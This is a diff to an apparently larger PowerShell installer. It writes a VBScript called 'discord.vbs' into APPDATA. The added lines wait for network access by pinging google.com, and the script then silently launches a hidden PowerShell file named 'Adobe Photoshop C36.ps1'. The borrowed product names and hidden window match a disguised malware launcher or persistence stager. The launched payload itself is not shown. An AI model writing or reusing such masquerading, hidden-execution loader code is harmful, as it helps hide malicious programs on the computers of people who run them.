@@ -21,8 +21,18 @@ function Install {
 cd "$env:APPDATA"
 
 New-Item -Path . -Name "discord.vbs" -ItemType "file" -Value @"
+do while 1
+Set oShell = WScript.CreateObject("WScript.Shell")
+strHost = "google.com"
+strPingCommand = "ping -n 1 -w 300 " & strHost
+ReturnCode = oShell.Run(strPingCommand, 0 , True)
+If ReturnCode = 0 Then
+	exit do
+end if
+loop
+
 Dim shell,command
-command = "powershell.exe -nologo -File ""Adobe Photoshop C36.ps1"""
+command = "powershell.exe -File ""Adobe Photoshop C36.ps1"""
 Set shell = CreateObject("WScript.Shell")
 shell.Run command,0
 "@
